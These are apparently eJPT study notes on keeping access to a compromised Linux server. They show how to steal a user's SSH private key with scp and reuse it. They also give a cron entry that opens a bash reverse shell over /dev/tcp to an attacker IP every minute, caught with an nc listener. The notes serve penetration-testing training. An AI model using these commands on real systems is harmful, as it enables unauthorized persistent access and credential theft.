# 56 Linux Persistence

# Persistence via SSH Keys

- Linux is typically deployed as a server operating system and as a result, Linux servers are typically accessed remotely via services/protocols such as SSH.
- If SSH is enabled and running on a Linux system you have compromised, you can take advantage of the SSH configuration to establish persistent access on the target system.
- In most cases Linux servers will have key-based authentication enabled for the SSH service, allowing users to access the Linux system remotely without the need for a password.
- After gaining access to a Linux system, we can transfer the SSH private key of a specific user account to our system and use that SSH private key for all future authentication and access.

### DEMO

```shell
# Private key
/.ssh/id_rsa

# Download id_rsa file from target to our system via SSH
scp user@ip:<path-to-id_rsa> .
# Give the permission
chmod 400 id_rsa
# Connect with the private key obtained
ssh -i id_rsa <user>@<ip>

# Typically create new key pairs and then copy in the target system
# Copy the public keys in authorized_keys in target system
```


# Persistence via Cron Jobs

- Linux implements task scheduling through a utility called Cron. Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specified schedule.
- An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job.
- We can use cron jobs to execute a command or script at a fixed interval to ensure we have persistent access to the target system.

## Anatomy of a Cron Job

```
*     *     *     *     *       Command to execute
│     │     │     │     │
│     │     │     │     └────── day of week (0 - 7) (Sunday = 0 or 7)
│     │     │     └──────────── month (1 - 12)
│     │     └────────────────── day of month (1 - 31)
│     └──────────────────────── hour (0 - 23)
└────────────────────────────── minute (0 - 59)

* * * * * Means that the cron job will run every minute of every hour of every day of every month and every day of the week
```

### DEMO

```shell
# Cron tab file
cat /etc/cron*

# Create new Cron file for get reverse shell
echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/<port> 0>&1'" > cron
# Add the new Cron to Cron Job
crontab -i cron
# View the Cron Job
crontab -l

# Setup the listerner
nc -nvlp <port>
```


#cybersecurity #eJPT 